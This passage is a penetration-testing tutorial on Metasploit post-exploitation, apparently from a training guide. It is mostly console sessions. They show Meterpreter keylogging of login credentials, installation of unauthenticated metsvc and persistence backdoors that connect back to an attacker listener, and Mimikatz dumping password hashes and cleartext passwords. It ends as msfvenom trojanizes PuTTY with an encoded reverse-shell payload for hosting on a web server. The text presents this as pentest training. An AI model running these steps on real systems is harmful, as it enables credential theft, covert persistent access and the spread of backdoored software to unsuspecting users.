+After successfully compromising a host, if the rules of engagement permit it, it is frequently a good idea to ensure that you will be able to maintain your access for further examination or penetration of the target network. This also ensures that you will be able to reconnect to your victim if you are using a one-off exploit or crash a service on the target. In situations like these, you may not be able to regain access again until a reboot of the target is preformed.
+
+Once you have gained access to one system, you can ultimately gain access to the systems that share the same subnet. Pivoting from one system to another, gaining information about the users activities by monitoring their keystrokes, and impersonating users with captured tokens are just a few of the techniques we will describe further in this module.
+
+Keylogging
+============
+
+After you have exploited a system there are two different approaches you can take, either smash and grab or low and slow.
+
+Low and slow can lead to a ton of great information, if you have the patience and discipline. One tool you can use for low and slow information gathering is the keystroke logger script with Meterpreter. This tool is very well designed, allowing you to capture all keyboard input from the system, without writing anything to disk, leaving a minimal forensic footprint for investigators to later follow up on. Perfect for getting passwords, user accounts, and all sorts of other valuable information.
+
+Lets take a look at it in action. First, we will exploit a system as normal.
+
+
+::
+
+  msf exploit(warftpd_165_user) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Connecting to FTP server 172.16.104.145:21...
+ [*] Connected to target FTP server.
+ [*] Trying target Windows 2000 SP0-SP4 English...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Sending stage (2650 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] Meterpreter session 4 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
+
+ meterpreter >
+
+Then, we will migrate Meterpreter to the Explorer.exe process so that we don’t have to worry about the exploited process getting reset and closing our session.
+
+
+::
+
+  meterpreter > ps
+
+ Process list
+ ============
+
+    PID   Name               Path
+    ---   ----               ----
+    140   smss.exe           \SystemRoot\System32\smss.exe
+    188   winlogon.exe       ??\C:\WINNT\system32\winlogon.exe
+    216   services.exe       C:\WINNT\system32\services.exe
+    228   lsass.exe          C:\WINNT\system32\lsass.exe
+    380   svchost.exe        C:\WINNT\system32\svchost.exe
+    408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe
+    444   svchost.exe        C:\WINNT\System32\svchost.exe
+    480   regsvc.exe         C:\WINNT\system32\regsvc.exe
+    500   MSTask.exe         C:\WINNT\system32\MSTask.exe
+    528   VMwareService.exe  C:\Program Files\VMwareVMware Tools\VMwareService.exe
+    588   WinMgmt.exe        C:\WINNT\System32\WBEMWinMgmt.exe
+    664   notepad.exe        C:\WINNT\System32\notepad.exe
+    724   cmd.exe            C:\WINNT\System32\cmd.exe
+    768   Explorer.exe       C:\WINNT\Explorer.exe
+    800   war-ftpd.exe       C:\Program Files\War-ftpd\war-ftpd.exe
+    888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe
+    972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+    1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+
+ meterpreter > migrate 768
+ [*] Migrating to 768...
+ [*] Migration completed successfully.
+ meterpreter > getpid
+ Current pid: 768
+
+Finally, we start the keylogger, wait for some time and dump the output.
+
+::
+
+  meterpreter > keyscan_start
+ Starting the keystroke sniffer...
+ meterpreter > keyscan_dump
+ Dumping captured keystrokes...
+   tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
+
+Could not be easier! Notice how keystrokes such as control and backspace are represented.
+
+As an added bonus, if you want to capture system login information you would just migrate to the winlogon process. This will capture the credentials of all users logging into the system as long as this is running.
+
+::
+
+  meterpreter > ps
+
+ Process list
+ =================
+
+ PID Name         Path
+ --- ----         ----
+ 401 winlogon.exe C:\WINNT\system32\winlogon.exe
+
+ meterpreter > migrate 401
+
+ [*] Migrating to 401...
+ [*] Migration completed successfully.
+
+ meterpreter > keyscan_start
+ Starting the keystroke sniffer...
+
+ **** A few minutes later after an admin logs in ****
+
+ meterpreter > keyscan_dump
+ Dumping captured keystrokes...
+ Administrator ohnoes1vebeenh4x0red!
+
+Here we can see by logging to the winlogon process allows us to effectively harvest all users logging into that system and capture it. We have captured the Administrator logging in with a password of ‘ohnoes1vebeenh4x0red!’.
+
+
+Meterpreter Backdoor
+===================
+
+After going through all the hard work of exploiting a system, it’s often a good idea to leave yourself an easier way back into it for later use. This way, if the service you initially exploited is down or patched, you can still gain access to the system. To read about the original implementation of metsvc, refer to http://www.phreedom.org/software/metsvc/.
+
+Using the metsvc backdoor, you can gain a Meterpreter shell at any point.
+
+One word of warning here before we go any further: metsvc as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, you would either alter the source to require authentication, or filter out remote connections to the port through some other method.
+
+First, we exploit the remote system and migrate to the ‘Explorer.exe’ process in case the user notices the exploited service is not responding and decides to kill it.
+
+::
+
+  msf exploit(3proxy) > exploit
+
+ [*] Started reverse handler
+ [*] Trying target Windows XP SP2 - English...
+ [*] Sending stage (719360 bytes)
+ [*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
+
+ meterpreter > ps
+
+ Process list
+ ============
+
+    PID   Name                 Path
+    ---   ----                 ----
+    132   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
+    176   svchost.exe          C:\WINDOWS\system32\svchost.exe
+    440   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
+    632   Explorer.EXE         C:\WINDOWS\Explorer.EXE
+    796   smss.exe             \SystemRoot\System32\smss.exe
+    836   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    844   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    884   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
+    908   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
+    952   services.exe         C:\WINDOWS\system32\services.exe
+    964   lsass.exe            C:\WINDOWS\system32\lsass.exe
+    1120  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+    1136  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1236  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1560  alg.exe              C:\WINDOWS\System32\alg.exe
+    1568  WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
+    1596  jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
+    1656  msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
+    1748  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
+    1928  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
+    2028  snmp.exe             C:\WINDOWS\System32\snmp.exe
+    2840  3proxy.exe           C:\3proxy\bin\3proxy.exe
+    3000  mmc.exe              C:\WINDOWS\system32\mmc.exe
+
+ meterpreter > migrate 632
+ [*] Migrating to 632...
+ [*] Migration completed successfully.
+
+
+Before installing metsvc, let’s see what options are available to us.
+
+::
+
+  meterpreter > run metsvc -h
+ [*]
+ OPTIONS:
+
+    -A        Automatically start a matching multi/handler to connect to the service
+    -h        This help menu
+    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
+
+ meterpreter >
+
+
+Since we’re already connected via a Meterpreter session, we won’t set it to connect back to us right away. We’ll just install the service for now.
+
+::
+
+  meterpreter > run metsvc
+ [*] Creating a meterpreter service on port 31337
+ [*] Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
+ [*]  >> Uploading metsrv.dll...
+ [*]  >> Uploading metsvc-server.exe...
+ [*]  >> Uploading metsvc.exe...
+ [*] Starting the service...
+ [*]      * Installing service metsvc
+  * Starting service
+ Service metsvc successfully installed.
+
+ meterpreter >
+
+
+The service is now installed and waiting for a connection.
+
+
+Interacting with Metsvc
+^^^^^^^^^^^^^^^^^^
+
+We will now use the multi/handler with a payload of ‘windows/metsvc_bind_tcp’ to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multi-stage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been achieved.
+
+Think of a shuttle rocket, and the booster rockets that are used to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.
+
+We set all of our options for ‘metsvc_bind_tcp’ with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.
+
+
+::
+
+  msf > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
+ PAYLOAD => windows/metsvc_bind_tcp
+ msf exploit(handler) > set LPORT 31337
+ LPORT => 31337
+ msf exploit(handler) > set RHOST 192.168.1.104
+ RHOST => 192.168.1.104
+ msf exploit(handler) > show options
+
+ Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+ Payload options (windows/metsvc_bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process
+   LPORT     31337            yes       The local port
+   RHOST     192.168.1.104    no        The target address
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+ msf exploit(handler) > exploit
+
+
+Immediately after issuing ‘exploit’, our metsvc backdoor connects back to us.
+
+::
+
+  [*] Starting the payload handler...
+ [*] Started bind handler
+ [*] Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
+
+ meterpreter > ps
+
+ Process list
+ ============
+
+   PID   Name               Path
+   ---   ----               ----
+   140   smss.exe           \SystemRoot\System32\smss.exe
+   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe
+   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe
+   216   services.exe       C:\WINNT\system32\services.exe
+   228   lsass.exe          C:\WINNT\system32\lsass.exe
+   380   svchost.exe        C:\WINNT\system32\svchost.exe
+   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe
+   444   svchost.exe        C:\WINNT\System32\svchost.exe
+   480   regsvc.exe         C:\WINNT\system32\regsvc.exe
+   500   MSTask.exe         C:\WINNT\system32\MSTask.exe
+   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
+   564   metsvc.exe         c:\WINNT\my\metsvc.exe
+   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe
+   676   cmd.exe            C:\WINNT\System32\cmd.exe
+   724   cmd.exe            C:\WINNT\System32\cmd.exe
+   764   mmc.exe            C:\WINNT\system32\mmc.exe
+   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe
+   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe
+   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+   1000  Explorer.exe       C:\WINNT\Explorer.exe
+   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+
+ meterpreter > pwd
+ C:\WINDOWS\system32
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+ meterpreter >
+
+
+And here we have a typical Meterpreter session! Again, be careful with when and how you use this trick. System owners will not be happy if you make an attackers job easier for them by placing such a useful backdoor on the system for them.
+
+
+Persistent Backdoors
+=======================
+
+
+
+Maintaining access is a very important phase of penetration testing, unfortunately, it is one that is often overlooked. Most penetration testers get carried away whenever administrative access is obtained, so if the system is later patched, then they no longer have access to it.
+
+Persistent backdoors help us access a system we have successfully compromised in the past. It is important to note that they may be out of scope during a penetration test; however, being familiar with them is of paramount importance. Let us look at a few persistent backdoors now!
+
+
+Meterpreter Service
+^^^^^^^^^^^^^^^^^^
+
+After going through all the hard work of exploiting a system, it’s often a good idea to leave yourself an easier way back into the system for later use. This way, if the service you initially exploited is down or patched, you can still gain access to the system. Metasploit has a Meterpreter script, persistence.rb, that will create a Meterpreter service that will be available to you even if the remote system is rebooted.
+
+One word of warning here before we go any further. The persistent Meterpreter as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, be sure to exercise the utmost caution and be sure to clean up after yourself when the engagement is done.
+
+Once we’ve initially exploited the host, we run the persistence script with the ‘-h’ switch to see which options are available:
+
+::
+
+  meterpreter > run persistence -h
+
+ [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+ [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+ Meterpreter Script for creating a persistent backdoor on a target host.
+
+ OPTIONS:
+
+    -A        Automatically start a matching exploit/multi/handler to connect to the agent
+    -L   Location in target host to write payload to, if none %TEMP% will be used.
+    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
+    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+    -T   Alternate executable template to use
+    -U        Automatically start the agent when the User logs on
+    -X        Automatically start the agent when the system boots
+    -h        This help menu
+    -i   The interval in seconds between each connection attempt
+    -p   The port on which the system running Metasploit is listening
+    -r   The IP of the system running Metasploit listening for the connect back
+
+
+We will configure our persistent Meterpreter session to wait until a user logs on to the remote system and try to connect back to our listener every 5 seconds at IP address 192.168.1.71 on port 443.
+
+::
+
+  meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
+ [*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
+ [*] Persistent agent script is 613976 bytes long
+ [*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
+ [*] Agent executed with PID 492
+ [*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+ [*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+ [*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
+ meterpreter >
+
+Notice that the script output gives you the command to remove the persistent listener when you are done with it. Be sure to make note of it so you don’t leave an unauthenticated backdoor on the system. To verify that it works, we reboot the remote system and set up our payload handler.
+
+::
+
+  meterpreter > reboot
+ Rebooting...
+ meterpreter > exit
+
+ [*] Meterpreter session 3 closed.  Reason: User exit
+ msf exploit(ms08_067_netapi) > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ msf exploit(handler) > set LHOST 192.168.1.71
+ LHOST => 192.168.1.71
+ msf exploit(handler) > set LPORT 443
+ LPORT => 443
+ msf exploit(handler) > exploit
+
+ [*] Started reverse handler on 192.168.1.71:443
+ [*] Starting the payload handler...
+
+
+When a user logs in to the remote system, a Meterpreter session is opened up for us.
+
+::
+
+  [*] Sending stage (748544 bytes) to 192.168.1.161
+ [*] Meterpreter session 5 opened (192.168.1.71:443 -> 192.168.1.161:1045) at 2010-08-21 12:31:42 -0600
+
+ meterpreter > sysinfo
+ Computer: XEN-XP-SP2-BARE
+ OS      : Windows XP (Build 2600, Service Pack 2).
+ Arch    : x86
+ Language: en_US
+ meterpreter >
+
+
+
+******************
+MSF Extended Usage
+*******************
+
+
+
+
+The Metasploit Framework is such a versatile asset in every pentesters toolkit, it is no shock to see it being expanded on constantly. Due to the openness of the Framework, as new technologies and exploits surface they are very rapidly incorporated into the msf svn trunk or end users write their own modules and share them as they see fit.
+
+We will be talking about backdooring .exe files, karmetasploit, and targeting Mac OS X.
+
+Mimikatz
+=========
+
+Mimikatz is a great post-exploitation tool written by Benjamin Delpy (gentilkiwi). After the initial exploitation phase, attackers may want to get a firmer foothold on the computer/network. Doing so often requires a set of complementary tools. Mimikatz is an attempt to bundle together some of the most useful tasks that attackers will want to perform.
+
+Fortunately, Metasploit has decided to include Mimikatz as a meterpreter script to allow for easy access to its full set of features without needing to upload any files to the disk of the compromised host.
+
+Note: The version of Mimikatz in metasploit is v1.0, however Benjamin Delpy has already released v2.0 as a stand-alone package on his website. This is relevant as a lot of the syntax has changed with the upgrade to v2.0.
+
+Loading Mimikatz
+^^^^^^^^^^^^^^^^^^
+
+After obtaining a meterpreter shell, we need to ensure that our session is running with SYSTEM level privileges for Mimikatz to function properly.
+
+::
+
+  meterpreter > getuid
+ Server username: WINXP-E95CE571A1\Administrator
+
+ meterpreter > getsystem
+ ...got system (via technique 1).
+
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+
+
+Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.
+
+::
+
+  meterpreter > sysinfo
+ Computer        : WINXP-E95CE571A1
+ OS              : Windows XP (Build 2600, Service Pack 3).
+ Architecture    : x86
+ System Language : en_US
+ Meterpreter     : x86/win32
+
+
+Since this is a 32bit machine, we can proceed to load the Mimikatz module into memory.
+
+::
+
+  meterpreter > load mimikatz
+ Loading extension mimikatz...success.
+
+ meterpreter > help mimikatz
+
+ Mimikatz Commands
+ =================
+
+    Command           Description
+    -------           -----------
+    kerberos          Attempt to retrieve kerberos creds
+    livessp           Attempt to retrieve livessp creds
+    mimikatz_command  Run a custom commannd
+    msv               Attempt to retrieve msv creds (hashes)
+    ssp               Attempt to retrieve ssp creds
+    tspkg             Attempt to retrieve tspkg creds
+    wdigest           Attempt to retrieve wdigest creds
+
+
+Metasploit provides us with some built-in commands that showcase Mimikatz’s most commonly-used feature, dumping hashes and clear text credentials straight from memory. However, the mimikatz_command option gives us full access to all the features in Mimikatz.
+
+::
+
+  meterpreter > mimikatz_command -f version
+ mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)
+
+Though slightly unorthodox, we can get a complete list of the available modules by trying to load a non-existent feature.
+
+::
+
+  meterpreter > mimikatz_command -f fu::
+ Module : 'fu' introuvable
+
+ Modules disponibles :
+                - Standard
+      crypto    - Cryptographie et certificats
+        hash    - Hash
+      system    - Gestion système
+     process    - Manipulation des processus
+      thread    - Manipulation des threads
+     service    - Manipulation des services
+   privilege    - Manipulation des privilèges
+      handle    - Manipulation des handles
+ impersonate    - Manipulation tokens d'accès
+     winmine    - Manipulation du démineur
+ minesweeper    - Manipulation du démineur 7
+       nogpo    - Anti-gpo et patchs divers
+     samdump    - Dump de SAM
+      inject    - Injecteur de librairies
+          ts    - Terminal Server
+      divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
+    sekurlsa    - Dump des sessions courantes par providers LSASS
+         efs    - Manipulations EFS
+
+To query the available options for these modules, we can use the following syntax.
+
+::
+
+  meterpreter > mimikatz_command -f divers::
+ Module : 'divers' identifié, mais commande '' introuvable
+
+ Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
+  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage
+   eventdrop    - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
+  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
+     secrets    - Affiche les secrets utilisateur
+
+
+Reading Hashes and Passwords from Memory
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can use both the built-in Metasploit commands as well as the native Mimikatz commands to extract hashes and clear-text credentials from the compromised machine.
+
+Built-In Metasploit:
+"""""""""""""""""""
+
+::
+
+  meterpreter > msv
+ [+] Running as SYSTEM
+ [*] Retrieving msv credentials
+ msv credentials
+ ===============
+
+ AuthID   Package    Domain           User              Password
+ ------   -------    ------           ----              --------
+ 0;78980  NTLM       WINXP-E95CE571A1  Administrator     lm{ 00000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
+ 0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
+ 0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
+ 0;56683  NTLM                                          n.s. (Credentials KO)
+ 0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)
+
+ meterpreter > kerberos
+ [+] Running as SYSTEM
+ [*] Retrieving kerberos credentials
+ kerberos credentials
+ ====================
+
+ AuthID   Package    Domain           User              Password
+ ------   -------    ------           ----              --------
+ 0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$
+ 0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE
+ 0;56683  NTLM
+ 0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE
+ 0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword
+
+
+Native Mimikatz:
+""""""""""""""""""
+
+::
+
+  meterpreter > mimikatz_command -f samdump::hashes
+ Ordinateur : winxp-e95ce571a1
+ BootKey    : 553d8c1349162121e2a5d3d0f571db7f
+
+ Rid  : 500
+ User : Administrator
+ LM   :
+ NTLM : d6eec67681a3be111b5605849505628f
+
+ Rid  : 501
+ User : Guest
+ LM   :
+ NTLM :
+
+ Rid  : 1000
+ User : HelpAssistant
+ LM   : 6165cd1a0ebc61e470475c82cd451e14
+ NTLM :
+
+ Rid  : 1002
+ User : SUPPORT_388945a0
+ LM   :
+ NTLM : 771ee1fce7225b28f8aec4a88aea9b6a
+
+ meterpreter > mimikatz_command -f sekurlsa::searchPasswords
+ [0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }
+
+Other Modules
+^^^^^^^^^^^^^^
+
+The other Mimikatz modules contain a lot of useful features. A more complete feature list can be found on Benjamin Delpy’s blog – http://blog.gentilkiwi.com/. Below are several usage examples to get an understanding of the syntax employed.
+
+The handle module can be used to list/kill processes and impersonate user tokens.
+
+::
+
+  meterpreter > mimikatz_command -f handle::
+ Module : 'handle' identifié, mais commande '' introuvable
+
+ Description du module : Manipulation des handles
+        list    - Affiche les handles du système (pour le moment juste les processus et tokens)
+ processStop    - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
+ tokenImpersonate        - Essaye d'impersonaliser un token en utilisant d'autres handles
+     nullAcl    - Positionne une ACL null sur des Handles
+
+ meterpreter > mimikatz_command -f handle::list
+ ...snip...
+  760  lsass.exe                 ->  1004       Token           NT AUTHORITY\NETWORK SERVICE
+  760  lsass.exe                 ->  1008       Process 704     winlogon.exe
+  760  lsass.exe                 ->  1052       Process 980     svchost.exe
+  760  lsass.exe                 ->  1072       Process 2664    fubar.exe
+  760  lsass.exe                 ->  1084       Token           NT AUTHORITY\LOCAL SERVICE
+  760  lsass.exe                 ->  1096       Process 704     winlogon.exe
+  760  lsass.exe                 ->  1264       Process 1124    svchost.exe
+  760  lsass.exe                 ->  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
+  760  lsass.exe                 ->  1276       Process 1804    psia.exe
+  760  lsass.exe                 ->  1352       Process 480     jusched.exe
+  760  lsass.exe                 ->  1360       Process 2056    TPAutoConnSvc.exe
+  760  lsass.exe                 ->  1424       Token           WINXP-E95CE571A1\Administrator
+ ...snip...
+
+
+The service module allows you to list, start, stop, and remove Windows services.
+
+::
+
+  meterpreter > mimikatz_command -f service::
+ Module : 'service' identifié, mais commande '' introuvable
+
+ Description du module : Manipulation des services
+        list    - Liste les services et pilotes
+       start    - Démarre un service ou pilote
+        stop    - Arrête un service ou pilote
+      remove    - Supprime un service ou pilote
+    mimikatz    - Installe et/ou démarre le pilote mimikatz
+
+ meterpreter > mimikatz_command -f service::list
+ ...snip...
+        WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
+        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device (RFCOMM Protocol TDI)
+        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call (RPC) Locator
+  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call (RPC)
+        WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
+  760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
+        WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
+ 1124   WIN32_SHARE_PROCESS     RUNNING Schedule        Task Scheduler
+        KERNEL_DRIVER   STOPPED Secdrv  Secdrv
+ 1124   INTERACTIVE_PROCESS     WIN32_SHARE_PROCESS     RUNNING seclogon        Secondary Logon
+ 1804   WIN32_OWN_PROCESS       RUNNING Secunia PSI Agent       Secunia PSI Agent
+ 3460   WIN32_OWN_PROCESS       RUNNING Secunia Update Agent    Secunia Update Agent
+ ...snip...
+
+
+The crypto module allows you to list and export any certificates and their corresponding private keys that may be stored on the compromised machine. This is possible even if they are marked as non-exportable.
+
+
+::
+
+  meterpreter > mimikatz_command -f crypto::
+ Module : 'crypto' identifié, mais commande '' introuvable
+
+ Description du module : Cryptographie et certificats
+ listProviders   - Liste les providers installés)
+  listStores    - Liste les magasins système
+ listCertificates        - Liste les certificats
+    listKeys    - Liste les conteneurs de clés
+ exportCertificates      - Exporte les certificats
+  exportKeys    - Exporte les clés
+    patchcng    - [experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
+   patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
+
+ meterpreter > mimikatz_command -f crypto::listProviders
+ Providers CryptoAPI :
+        Gemplus GemSAFE Card CSP v1.0
+        Infineon SICRYPT Base Smart Card CSP
+        Microsoft Base Cryptographic Provider v1.0
+        Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
+        Microsoft Base DSS Cryptographic Provider
+        Microsoft Base Smart Card Crypto Provider
+        Microsoft DH SChannel Cryptographic Provider
+        Microsoft Enhanced Cryptographic Provider v1.0
+        Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
+        Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
+        Microsoft RSA SChannel Cryptographic Provider
+        Microsoft Strong Cryptographic Provider
+
+Never Lose at Minesweeper Again!
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Mimikatz also includes a lot of novelty features. One of our favourites is a module that can read the location of mines in the classic Windows Minesweeper game, straight from memory!
+
+::
+
+  meterpreter > mimikatz_command -f winmine::infos
+ Mines           : 99
+ Dimension       : 16 lignes x 30 colonnes
+ Champ           :
+
+         . . . . . . * . * 1   1 * 1           1 * . . . . . . * . *
+         . . * . . . . . . 1   1 1 1       1 1 2 . * . * * . * * . .
+         . * . . . . . * . 1         1 1 1 1 * . . . * . . * . . . .
+         . . . . . * . * * 2 1     1 2 * . . . * * . . * . . . . * .
+         . . * . . * . . . * 1     1 * . * . . . . . . . * . * . . .
+         . * * . . . . . . . 2 1 1 1 . * . . . . * . . * . . . . . .
+         . . . . . . . . . . . * . . . . . * . . . . . * * . . . . .
+         . . . * . * . . . . . * . * . . . . * . . . . * . . . . . .
+         . . . . . * * . * . * . * . * * . * * * . . . . . . . . * .
+         * * . * . . . 3 1 2 1 2 1 . . * . . * . . * . . * . . . . .
+         . . . . * * * 1         1 . . * * . . . * . . . . . . * . *
+         . . * * * . 3 1     1 1 2 * 2 2 2 . * . . . . . . * . . . .
+         . . . . . * 1   1 1 2 * . 1 1   1 . . . . * . * * * . . . .
+         . . . . . . 1   1 * . . . 1     1 * . . . * . . . . . * . .
+         . . . . . . 1 1 2 . . . * 1     1 1 1 1 * * . * . . . . * .
+         . * . . . . . * . . . * . 1           1 . * . . . . . . . *
+
+
+Backdooring EXE Files
+======================
+
+Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple. We begin by first downloading our legitimate executable, in this case, the popular PuTTY client.
+
+::
+
+  root@kali:/var/www# wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ --2015-07-21 12:01:27--  http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ Resolving the.earth.li (the.earth.li)... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
+ Connecting to the.earth.li (the.earth.li)|46.43.34.31|:80... connected.
+ HTTP request sent, awaiting response... 302 Found
+ Location: http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe [following]
+ --2015-07-21 12:01:27--  http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe
+ Reusing existing connection to the.earth.li:80.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 524288 (512K) [application/x-msdos-program]
+ Saving to: `putty.exe'
+
+ 100%[=========================================================================================================>] 524,288      815K/s   in 0.6s
+
+ 2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved [524288/524288]
+
+ root@kali:/var/www#
+
+
+Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.
+
+::
+
+  root@kali:/var/www# msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+ Found 1 compatible encoders
+ Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+ x86/shikata_ga_nai succeeded with size 353 (iteration=1)
+ x86/shikata_ga_nai succeeded with size 380 (iteration=2)
